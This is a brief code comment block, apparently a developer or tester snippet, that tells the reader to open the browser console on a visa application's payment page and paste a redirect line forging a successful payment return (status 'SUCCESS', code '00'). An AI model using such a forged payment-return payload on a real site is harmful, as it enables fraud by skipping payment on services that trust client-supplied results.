
// =========================================================
// 🧪 VISA PAYMENT BYPASS COMMAND
// =========================================================
// 1. Fill out the application form at /apply-visa
// 2. On the Payment Selection page, open DevTools (F12) > Console
// 3. Paste the following line and press Enter:

window.location.href = '/payment-return?O=VISA-TEST-' + Date.now() + '&TS=SUCCESS&RC=00';

// =========================================================
